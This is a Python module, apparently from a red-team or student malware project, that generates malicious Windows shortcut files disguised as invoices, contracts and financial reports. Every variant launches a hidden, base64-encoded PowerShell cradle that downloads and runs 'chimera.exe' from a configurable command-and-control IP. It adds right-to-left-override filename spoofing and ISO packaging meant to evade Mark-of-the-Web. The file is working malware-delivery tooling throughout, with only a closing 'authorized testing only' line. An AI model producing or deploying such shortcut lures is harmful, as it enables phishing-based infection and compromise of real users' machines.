"""
Delivery Specialist Module: LNK Masquerading
Developer: Lorn Thornpunleu (Puleu)
Purpose: Generate malicious LNK (shortcut) files disguised as documents

Project Spec: "LNK Masquerading: Creating a Windows Shortcut (.LNK) with a 
PDF icon. When clicked, it runs a PowerShell script to fetch the malware."
"""

import base64
import os
import subprocess
import sys

# C2 Server configuration - change to your Kali IP
C2_IP = "192.168.56.101"

class LNKGenerator:
    """Generate malicious LNK files for malware delivery"""
    
    def __init__(self, c2_ip=None):
        self.c2_ip = c2_ip or C2_IP
        self.output_dir = "example_payloads"
        
    def _check_windows(self):
        """Check if running on Windows (required for COM objects)"""
        if sys.platform != "win32":
            print("[!] LNK generation requires Windows (uses COM objects)")
            print("[!] Run this script on your Windows VM")
            return False
        return True
    
    def create_lnk(self, target_path, args, icon, filename):
        """
        Create a Windows shortcut file
        
        Args:
            target_path: Path to target executable (e.g., powershell.exe)
            args: Arguments to pass to target
            icon: Icon location (e.g., shell32.dll,3)
            filename: Output filename for the LNK
        """
        if not self._check_windows():
            # Create a placeholder file for non-Windows systems
            os.makedirs(self.output_dir, exist_ok=True)
            placeholder_path = os.path.join(self.output_dir, filename + ".txt")
            with open(placeholder_path, 'w') as f:
                f.write(f"LNK Placeholder - Run on Windows to generate actual .lnk\n")
                f.write(f"Target: {target_path}\n")
                f.write(f"Args: {args[:100]}...\n")
                f.write(f"Icon: {icon}\n")
            print(f"[!] Created placeholder: {placeholder_path}")
            return placeholder_path
        
        try:
            import win32com.client
            shell = win32com.client.Dispatch("WScript.Shell")
            shortcut = shell.CreateShortCut(filename)
            shortcut.Targetpath = target_path
            shortcut.Arguments = args
            shortcut.IconLocation = icon
            shortcut.WorkingDirectory = "%TEMP%"
            shortcut.save()
            print(f"[+] Created LNK: {filename}")
            return filename
        except ImportError:
            print("[!] pywin32 not installed. Run: pip install pywin32")
            return None
        except Exception as e:
            print(f"[!] LNK creation failed: {e}")
            return None

    def generate_powershell_payload(self):
        """Generate encoded PowerShell download cradle"""
        ps_script = (
            f'$c=New-Object Net.WebClient;'
            f'$c.DownloadFile("http://{self.c2_ip}/chimera.exe","$env:TEMP\\chimera.exe");'
            f'Start-Process "$env:TEMP\\chimera.exe"'
        )
        # Encode for PowerShell -EncodedCommand
        encoded = base64.b64encode(ps_script.encode('utf-16-le')).decode()
        return encoded
    
    def generate_all_variants(self):
        """Generate all LNK variant types"""
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Get encoded PowerShell payload
        encoded_ps = self.generate_powershell_payload()
        ps_args = f"-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {encoded_ps}"
        
        created_files = []
        
        # Variant 1: Classic PDF-disguised LNK
        print("\n[*] Variant 1: Classic PDF-disguised LNK")
        lnk1 = self.create_lnk(
            "powershell.exe",
            ps_args,
            "shell32.dll,3",  # PDF icon
            os.path.join(self.output_dir, "Invoice_1128.pdf.lnk")
        )
        if lnk1:
            created_files.append(lnk1)
        
        # Variant 2: RTLO (Right-to-Left Override) trick
        print("\n[*] Variant 2: RTLO filename spoofing")
        rtlo_char = "\u202E"  # Right-to-Left Override
        # "Invoice_1128\u202Efdp.lnk" displays as "Invoice_1128knl.pdf"
        lnk2 = self.create_lnk(
            "powershell.exe",
            ps_args,
            "shell32.dll,3",
            os.path.join(self.output_dir, f"Invoice_1128{rtlo_char}fdp.lnk")
        )
        if lnk2:
            created_files.append(lnk2)
        
        # Variant 3: Word document disguise
        print("\n[*] Variant 3: Word document disguise")
        lnk3 = self.create_lnk(
            "powershell.exe",
            ps_args,
            "shell32.dll,1",  # Document icon
            os.path.join(self.output_dir, "Contract_Agreement.docx.lnk")
        )
        if lnk3:
            created_files.append(lnk3)
        
        # Variant 4: Excel spreadsheet disguise
        print("\n[*] Variant 4: Excel spreadsheet disguise")
        lnk4 = self.create_lnk(
            "powershell.exe",
            ps_args,
            "shell32.dll,2",  # Spreadsheet icon
            os.path.join(self.output_dir, "Financial_Report_2025.xlsx.lnk")
        )
        if lnk4:
            created_files.append(lnk4)
        
        return created_files
    
    def generate_iso_with_lnk(self):
        """
        Generate ISO file containing malicious LNK
        ISO files bypass Mark-of-the-Web (MOTW) protection
        """
        if not self._check_windows():
            print("[!] ISO generation requires Windows")
            return None
        
        print("\n[*] Variant 5: ISO container with LNK")
        
        try:
            iso_dir = "temp_iso"
            os.makedirs(iso_dir, exist_ok=True)
            
            # Create LNK inside ISO directory
            encoded_ps = self.generate_powershell_payload()
            ps_args = f"-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {encoded_ps}"
            
            self.create_lnk(
                "powershell.exe",
                ps_args,
                "shell32.dll,3",
                os.path.join(iso_dir, "Open_Invoice.pdf.lnk")
            )
            
            # Create ISO using PowerShell
            iso_path = os.path.join(self.output_dir, "DHL_Invoice_1128.iso")
            ps_iso_cmd = f'''
            $source = "{os.path.abspath(iso_dir)}"
            $dest = "{os.path.abspath(iso_path)}"
            
            # Check if New-IsoFile is available, otherwise use fallback
            try {{
                Get-ChildItem $source | New-IsoFile -Path $dest
            }} catch {{
                # Fallback: just copy files and note ISO creation failed
                Write-Output "ISO_CREATION_NEEDS_TOOL"
            }}
            '''
            
            result = subprocess.run(
                ['powershell', '-Command', ps_iso_cmd],
                capture_output=True, text=True
            )
            
            if "ISO_CREATION_NEEDS_TOOL" in result.stdout:
                print("[!] ISO creation requires additional tools")
                print(f"[!] LNK file created in: {iso_dir}/")
            else:
                print(f"[+] ISO created: {iso_path}")
            
            # Cleanup temp directory
            import shutil
            shutil.rmtree(iso_dir, ignore_errors=True)
            
            return iso_path
            
        except Exception as e:
            print(f"[!] ISO creation failed: {e}")
            return None


def generate_all_lnks(c2_ip=None):
    """
    Generate all LNK variants - entry point for integration
    
    Args:
        c2_ip: C2 server IP address (optional)
    
    Returns:
        list: Paths to generated LNK files
    """
    generator = LNKGenerator(c2_ip)
    return generator.generate_all_variants()


if __name__ == "__main__":
    print("🔴 LNK MASQUERADING GENERATOR - Delivery Specialist")
    print("=" * 50)
    print("Generates malicious LNK files disguised as documents")
    print("=" * 50)
    
    # Get C2 IP
    c2_input = input(f"\nC2 Server IP [default: {C2_IP}]: ").strip()
    c2_ip = c2_input if c2_input else C2_IP
    
    generator = LNKGenerator(c2_ip)
    
    print("\nSelect generation mode:")
    print("1. Generate all LNK variants")
    print("2. Generate single LNK")
    print("3. Generate ISO with LNK (bypasses MOTW)")
    
    choice = input("\nChoice (1-3) [default: 1]: ").strip() or "1"
    
    if choice == "1":
        files = generator.generate_all_variants()
        print(f"\n✅ Generated {len(files)} LNK variants in {generator.output_dir}/")
    elif choice == "2":
        name = input("Output filename [default: malicious.pdf.lnk]: ").strip() or "malicious.pdf.lnk"
        generator.create_lnk(
            "powershell.exe",
            f"-NoProfile -WindowStyle Hidden -EncodedCommand {generator.generate_powershell_payload()}",
            "shell32.dll,3",
            os.path.join(generator.output_dir, name)
        )
    elif choice == "3":
        generator.generate_iso_with_lnk()
    
    print("\n⚠️  These files are for authorized testing only!")